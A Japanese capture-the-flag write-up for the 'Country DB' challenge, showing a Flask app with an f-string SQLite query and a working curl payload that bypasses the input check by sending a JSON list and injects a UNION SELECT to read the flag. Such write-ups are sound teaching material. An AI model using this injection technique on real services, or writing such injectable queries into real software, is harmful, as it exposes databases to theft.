# Country DB

> Do you know which country code 'CA' and 'KE' are for?
Search country codes here!

サーバー起こす系の問題

[country-db.tar.gz](https://alpacahack-prod.s3.ap-northeast-1.amazonaws.com/ce3f6e61-931b-458d-8c2d-fc8aa6c02e4a/country-db.tar.gz)が提供される

app.py

```py
#!/usr/bin/env python3
import flask
import sqlite3

app = flask.Flask(__name__)

def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    return flask.render_template("index.html")

@app.route('/api/search', methods=['POST'])
def api_search():
    req = flask.request.get_json()
    if 'code' not in req:
        flask.abort(400, "Empty country code")

    code = req['code']
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")

    return {'name': name}

if __name__ == '__main__':
    app.run(debug=True)
```

```py
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        # VULNERABLE LINE
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]
```

この関数に`sqlインジェクション`の脆弱性が存在する

codeをそのまま入れているためできそう。

```py
code = req['code']
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")
```
でcodeの長さが2かつ'が含まれてはいない。

codeはリスト形式を許容するため、["AB", "CD"]のようなデータでも通る。

後はSQL文を考えればいいだけ

```bash
> curl -X POST -H "Content-Type: application/json" -d '{
  "code": [
    ") UNION SELECT flag FROM flag --",
    "x"
  ]
}' http://34.170.146.252:22118/api/search
{"name":"CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}"}
```

flag: `CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}`
